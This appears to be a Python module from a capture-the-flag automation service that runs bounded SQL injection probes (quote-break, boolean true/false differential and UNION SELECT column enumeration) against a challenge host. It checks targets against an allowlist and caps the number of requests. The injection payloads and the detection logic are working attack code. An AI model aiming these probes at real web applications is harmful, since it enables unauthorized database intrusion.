from urllib.parse import urlparse

from fastapi import HTTPException

from app.models import JobRequest
from app.executors.http_executor import execute_http


MAX_PROBE_REQUESTS = 40
MAX_UNION_COLUMNS = 10


def _validate_target(request: JobRequest, endpoint: str) -> None:
    host = urlparse(endpoint).hostname
    if not host or host.lower() not in {item.lower() for item in request.allowed_hosts}:
        raise HTTPException(403, detail="SQL automation is restricted to the challenge host")


def _signature(result: dict) -> dict:
    body = str(result.get("body") or result.get("body_excerpt") or "")
    return {
        "status": result.get("status_code"),
        "length": int(result.get("body_length") or len(body)),
        "hash": __import__("hashlib").sha256(body.encode(errors="replace")).hexdigest(),
        "error_signatures": [term for term in ("sql", "syntax", "database", "sqlite", "mysql", "postgres") if term in body.lower()],
    }


async def _request(request: JobRequest, endpoint: str, parameter: str, value: str) -> dict:
    return await execute_http(JobRequest(
        run_id=request.run_id,
        allowed_hosts=request.allowed_hosts,
        tool="http_request",
        arguments={"method": "GET", "url": endpoint, "query": {parameter: value}, "timeout": 15},
    ))


async def sql_injection_probe(request: JobRequest) -> dict:
    args = request.arguments
    endpoint = str(args.get("endpoint") or args.get("url") or "")
    parameter = str(args.get("parameter") or "")
    if not endpoint or not parameter:
        raise HTTPException(422, detail="endpoint and parameter are required")
    _validate_target(request, endpoint)
    baseline = str(args.get("baseline_value") or "1")
    true_suffix = str(args.get("true_condition") or "' AND 1=1")
    false_suffix = str(args.get("false_condition") or "' AND 1=2")
    comments = args.get("comment_styles") or ["-- ", "#", "/*"]
    values = [baseline, baseline + "'", baseline + '"', baseline + true_suffix, baseline + false_suffix]
    values.extend(baseline + "' " + str(item) for item in list(comments)[:3])
    max_requests = min(max(int(args.get("max_requests") or len(values)), 1), MAX_PROBE_REQUESTS)
    observations = []
    for value in values[:max_requests]:
        result = await _request(request, endpoint, parameter, value)
        observations.append({"payload": value, "signature": _signature(result)})
    base = observations[0]["signature"] if observations else {}
    different = [item for item in observations[1:] if item["signature"] != base]
    true_sig = next((item["signature"] for item in observations if item["payload"] == baseline + true_suffix), None)
    false_sig = next((item["signature"] for item in observations if item["payload"] == baseline + false_suffix), None)
    boolean_differential = bool(true_sig and false_sig and true_sig != false_sig)
    error_signals = sorted({term for item in observations for term in item["signature"]["error_signatures"]})
    return {
        "status": "COMPLETED",
        "summary": "Bounded SQL injection probe completed",
        "structured_result": {
            "observations": observations,
            "status_differences": len({item["signature"]["status"] for item in observations}),
            "length_differences": len({item["signature"]["length"] for item in observations}),
            "hash_differences": len({item["signature"]["hash"] for item in observations}),
            "error_signatures": error_signals,
            "boolean_differential": boolean_differential,
            "likely_dialect": "sqlite" if "sqlite" in error_signals else "unknown",
            "confidence": min(0.99, 0.35 + (0.35 if boolean_differential else 0) + (0.15 if different else 0) + (0.15 if error_signals else 0)),
            "sql_syntax_signal": bool(error_signals or different),
            "sql_injection_confirmed": boolean_differential,
        },
    }


async def sql_boolean_compare(request: JobRequest) -> dict:
    args = dict(request.arguments)
    args["max_requests"] = min(int(args.get("max_requests") or 3), 4)
    result = await sql_injection_probe(request.model_copy(update={"arguments": args}))
    structured = result["structured_result"]
    return {"status": "COMPLETED", "summary": "Boolean SQL differential completed", "structured_result": {
        "true_false_differential": structured["boolean_differential"],
        "baseline": structured["observations"][0] if structured["observations"] else None,
        "true_false_signals": structured["observations"][-2:],
        "sql_injection_confirmed": structured["sql_injection_confirmed"],
    }}


async def sql_union_probe(request: JobRequest) -> dict:
    args = request.arguments
    endpoint = str(args.get("endpoint") or "")
    parameter = str(args.get("parameter") or "")
    if not endpoint or not parameter:
        raise HTTPException(422, detail="endpoint and parameter are required")
    _validate_target(request, endpoint)
    max_columns = min(max(int(args.get("max_columns") or 1), 1), MAX_UNION_COLUMNS)
    max_requests = min(max(int(args.get("max_requests") or max_columns * 2), 1), MAX_PROBE_REQUESTS)
    baseline = str(args.get("baseline_value") or "1")
    comments = [str(item) for item in (args.get("candidate_comment_styles") or ["-- ", "#", "/*"])]
    observations = []
    requests = 0
    reflected_columns = []
    for columns in range(1, max_columns + 1):
        if requests >= max_requests:
            break
        select_list = ",".join(f"'ctfctl_{index}'" for index in range(columns))
        for comment in comments[:2]:
            if requests >= max_requests:
                break
            payload = f"{baseline}' UNION SELECT {select_list} {comment}"
            result = await _request(request, endpoint, parameter, payload)
            signature = _signature(result)
            body = str(result.get("body") or "")
            reflected = [index for index in range(columns) if f"ctfctl_{index}" in body]
            observations.append({"columns": columns, "comment": comment, "payload": payload, "signature": signature, "reflected_columns": reflected})
            if reflected:
                reflected_columns = reflected
            requests += 1
    return {"status": "COMPLETED", "summary": "Bounded UNION probe completed", "structured_result": {
        "column_count_candidates": sorted({item["columns"] for item in observations if item["reflected_columns"]}),
        "reflected_columns": reflected_columns,
        "union_confirmed": bool(reflected_columns),
        "requests": requests,
        "max_columns": max_columns,
        "max_requests": max_requests,
        "full_database_extraction": False,
    }}
